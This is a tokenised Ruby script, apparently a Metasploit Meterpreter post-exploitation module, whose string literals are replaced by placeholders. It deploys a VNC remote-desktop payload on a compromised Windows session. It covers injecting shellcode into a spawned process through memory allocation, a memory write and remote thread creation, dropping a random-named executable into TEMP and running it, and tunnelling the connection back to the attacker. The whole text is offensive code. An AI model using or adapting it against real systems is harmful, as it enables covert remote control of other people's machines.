session = client opts = Rex :: Parser :: Arguments . new ( <str> = > [ false , <str> ] , <str> = > [ true , <str> ] , <str> = > [ true , <str> ] , <str> = > [ true , <str> ] , <str> = > [ false , <str> ] , <str> = > [ true , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] , <str> = > [ false , <str> ] ) if ( client . sock and client . sock . respond_to? <str> and client . sock . peerhost ) rhost = Rex :: Socket . source_address ( client . sock . peerhost ) else rhost = Rex :: Socket . source_address ( <str> ) end rport = <int> vport = <int> lhost = <str> autoconn = true autovnc = true anyaddr = false courtesy = false tunnel = false inject = false runme = <str> pay = nil opts . parse ( args ) do | opt , idx , val | case opt when <str> print_line ( opts . usage ) raise Rex :: Script :: Completed when <str> rhost = val when <str> rport = val . to_i when <str> vport = val . to_i when <str> runme = val when <str> autoconn = false when <str> anyaddr = true when <str> autovnc = false when <str> courtesy = true when <str> tunnel = true autoconn = true when <str> inject = true end end def unsupported print_error ( <str> ) raise Rex :: Script :: Completed end unsupported if client . platform !~ <str> if ( tunnel ) print_status ( <str> lhost <str> rport <str> ) payload = <str> pay = client . framework . payloads . create ( payload ) pay . datastore [ <str> ] = lhost pay . datastore [ <str> ] = rport pay . datastore [ <str> ] = vport else print_status ( <str> rhost <str> rport <str> ) payload = <str> pay = client . framework . payloads . create ( payload ) pay . datastore [ <str> ] = rhost pay . datastore [ <str> ] = rport pay . datastore [ <str> ] = vport end if ( not courtesy ) pay . datastore [ <str> ] = true end if ( anyaddr ) pay . datastore [ <str> ] = <str> end if autoconn mul = client . framework . exploits . create ( <str> ) mul . share_datastore ( pay . datastore ) mul . datastore [ <str> ] = client . workspace mul . datastore [ <str> ] = payload mul . datastore [ <str> ] = <str> mul . datastore [ <str> ] = true mul . datastore [ <str> ] = <int> mul . datastore [ <str> ] = autovnc print_status ( <str> ) mul . exploit_simple ( <str> = > mul . datastore [ <str> ] , <str> = > true ) end raw = pay . generate if ( inject ) pid = client . sys . process . execute ( <str> runme <str> , nil , { <str> = > <str> } ) . pid print_status ( <str> runme <str> pid <str> ) host_process = client . sys . process . open ( pid , PROCESS_ALL_ACCESS ) mem = host_process . memory . allocate ( raw . length + ( raw . length % <int> ) ) print_status ( <str> % mem <str> raw . length <str> ) print_status ( <str> ) host_process . memory . write ( mem , raw ) host_process . thread . create ( mem , <int> ) else exe = :: Msf :: Util :: EXE . to_win32pe ( client . framework , raw ) print_status ( <str> exe . length <str> ) tempdir = client . sys . config . getenv ( <str> ) tempexe = tempdir + <str> + Rex :: Text . rand_text_alpha ( ( rand ( <int> ) + <int> ) ) + <str> tempexe . gsub! ( <str> , <str> ) fd = client . fs . file . new ( tempexe , <str> ) fd . write ( exe ) fd . close print_status ( <str> tempexe <str> ) print_status ( <str> rhost <str> rport <str> ) pid = session . sys . process . execute ( tempexe , nil , { <str> = > true } ) end if tunnel print_status ( <str> rport <str> rport <str> ) client . run_cmd ( <str> rport <str> rport <str> lhost <str> ) end 
